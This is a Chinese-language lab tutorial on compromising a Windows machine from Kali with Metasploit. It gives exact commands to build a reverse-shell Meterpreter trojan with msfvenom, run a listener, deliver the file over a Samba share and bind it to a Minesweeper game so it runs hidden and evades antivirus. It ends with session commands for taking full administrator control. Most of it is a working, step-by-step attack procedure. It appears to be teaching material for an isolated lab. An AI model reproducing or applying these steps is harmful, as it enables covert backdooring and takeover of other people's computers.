Kali渗透Windows服务器

分类：
标签：

日期：2026-04-01 22:40:46

获取kali本机ip

输入ifconfig
ifconfig是Linux系统查看网卡配置信息的标准命令，会列出所有网卡的IP地址、MAC地址、收发数据包等信息。后续生成的木马后门需要反向连接到Kali的IP，必须先确认Kali的真实内网地址。

用msfvenom生成 setup.exe 后门木马

在终端输入msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.102 -f exe > setup.exe

msfvenom  Metasploit框架自带的木马生成工具，专门用于生成跨平台的后门程序、载荷

-p windows/meterpreter/reverse_tcp  指定载荷（Payload）：Windows平台的反向连接Meterpreter木马，运行后会主动回连Kali
 LHOST=10.1.1.102  木马回连的目标IP（必须和 ifconfig 查到的KaliIP完全一致），指定木马要连接的Kali主机。
 
-f exe  指定生成的文件格式为 Windows可执行文件（.exe），适配靶机Windows系统

 > setup.exe  将生成的木马文件重定向输出，保存为 setup.exe ，方便后续捆绑、传输
 
 这一步是制作渗透的「武器」——反向连接木马，相比正向连接，反向连接能绕过靶机防火墙，是渗透测试最常用的木马类型

给 setup.exe 加执行权限

进入 setup.exe 所在目录，右键文件→属性→权限，勾选「允许此文件作为程序运行

Linux系统的文件权限严格区分读/写/执行，不开启执行权限，系统会阻止文件运行，必须手动授权才能正常使用

启动msfconsole + 加载监听模块

启动Metasploit框架控制台
输入msfconsole

加载监听模块（专门接收木马回连）
use exploit/multi/handler

设置监听主机（Kali的IP，和木马LHOST一致）
set LHOST 10.1.1.102

后台启动监听（不占用当前终端）
exploit -z -j

木马生成后，必须在Kali开启监听，才能接收靶机木马的反向连接，建立渗透会话，这是渗透的「核心桥梁」

建Samba共享目录 + 传木马到靶机

  1. 创建共享目录/a/share并授权
    mkdir /a/share -p

将生成的木马复制到共享目录
cp setup.exe /a/share

给共享目录赋予最大权限（-R 递归应用到所有子文件/子目录）
chmod 777 -R /a/share

Samba是Linux和Windows之间的文件共享协议，这一步是搭建「木马传输通道」，把Kali生成的木马传到Windows靶机

2.修改Samba配置文件
 vim /etc/samba/smb.conf  用Vim编辑器打开Samba的核心配置文件，这是配置共享服务的关键步骤
 输入
 [share]
path = /a/share
available = yes //启用该共享，设置为 no 则共享不可用
browseable = yes //允许Windows在网络中看到该共享，设置为 no 则隐藏共享
public = no //必须输入用户名密码才能访问
writable = yes //允许用户在共享目录中写入文件

3.创建Samba用户并重启服务

创建系统用户a（Samba依赖系统用户）
useradd a

为用户a设置Samba密码（输入两次，无回显）
smbpasswd -a a

重启Samba服务，使配置生效
/etc/init.d/smbd restart

创建Samba用户是为了身份验证，避免匿名访问共享，符合实验的安全配置要求；重启服务是让所有配置生效，靶机才能正常访问共享

4.Windows靶机访问共享

在Windows靶机的文件资源管理器中输入  \10.1.1.102\share ，输入Samba用户名 a 和设置的密码，即可看到 setup.exe 并下载

通过Samba共享，将Kali生成的木马传输到Windows靶机，完成渗透的

木马捆绑

用EXE捆绑机合并木马和正常软件

打开 ExeBinder.exe 捆绑软件
第一个可执行文件：选择正常软件（本实验为自带的「小游戏_扫雷.exe」）
第二个可执行文件：选择之前生成的木马 setup.exe 
指定捆绑后文件的保存路径
选择版本类型（普通版），点击「开始捆绑」
操作/工具作用：

  •  ExeBinder  是EXE文件捆绑工具，可以将两个可执行文件合并为一个，运行时两个文件同时执行
  • 第一个文件是「可见的正常软件」（扫雷），第二个是「隐藏的木马」，捆绑后木马不会被用户察觉
    为什么做：
    直接给靶机发 setup.exe 木马，很容易被杀毒软件查杀、被用户发现；捆绑木马是渗透的「伪装手段」，用户运行正常软件时，木马会在后台悄悄运行，实现「免杀+隐蔽渗透」，绕过部分杀毒软件的检测

渗透测试 + 控制靶机

1.靶机运行捆绑后的文件，Kali监听收到回连

Windows靶机双击运行捆绑后的文件（正常软件正常打开，木马后台运行）
 Kali的msf监听模块收到靶机的反向连接，终端显示：plaintext
在msf控制台输入指令：sessions

sessions  是Metasploit查看所有活跃渗透会话的核心命令，会列出会话ID、靶机IP、连接信息等
本实验中会显示会话ID为 1 ，靶机IP为 10.1.1.100 ，确认靶机已经被成功控制

sessions -i 1   -i 表示「交互（interact）」，进入ID为 1 的Meterpreter会话，获取靶机的控制权
sysinfo  查看靶机的完整系统信息，包括计算机名、系统版本、架构、系统语言、登录用户数等
getuid  查看靶机当前运行的用户权限，本实验显示 WINDOWS9AB36905\Administrator ，即管理员最高权限
 getsystem  Meterpreter的自动提权命令，会自动利用系统漏洞提升权限，从普通用户权限提升到管理员权限  

  •  sessions -i 1  是「进入靶机控制权」的操作，进入后就能直接操作靶机的系统、文件、进程
  •  sysinfo  用来收集靶机信息，确认靶机的系统版本、架构，为后续渗透、提权、攻击做准备
  •  getuid  用来确认当前权限， Administrator  是Windows最高权限，说明已经完全控制靶机
  •  getsystem  用于权限不足时的提权，实现对靶机的「完全控制」

实验逻辑总结

完整的「木马生成→传输→伪装→渗透→控制」的Windows服务器渗透流程

1. 生成木马：用msfvenom制作反向连接后门，是渗透的「武器」
​
2. 共享传输：用Samba把木马传到靶机，是渗透的「运输通道」
​
3. 捆绑伪装：把木马和正常软件合并，是渗透的「隐蔽手段」，绕过查杀和用户察觉
​
4. 监听回连：用msf的handler模块接收木马连接，建立控制会话，是渗透的「核心桥梁」
​
5. 控制靶机：进入Meterpreter会话，执行命令收集信息、提权，实现「完全控制靶机」
